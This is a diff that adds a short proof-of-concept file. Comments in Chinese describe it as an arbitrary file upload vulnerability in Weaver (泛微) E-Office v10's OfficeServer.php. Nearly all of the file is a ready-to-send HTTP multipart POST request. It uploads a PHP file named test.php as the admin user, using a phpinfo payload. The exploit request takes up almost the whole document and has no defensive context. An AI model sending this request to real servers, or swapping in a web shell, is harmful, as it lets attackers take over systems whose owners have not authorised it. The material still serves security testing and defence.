@@ -1,0 +1,20 @@
+# 泛微OA E-Office v10 OfficeServer.php 任意文件上传漏洞
+# 泛微OA E-Office OfficeServer.php 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息
+POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php?acid=80025425&bid=hd_tag_m8mv260e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260e
+RM-PRO-Token: df592d3f4cd41b70fff10121e5c703c7
+RM-PRO-Time: 1742808519747
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data;name="FileData";filename="test.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo();?>
+------WebKitFormBoundary
+Content-Disposition: form-data;name="FormData"
+
+{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
+------WebKitFormBoundary--
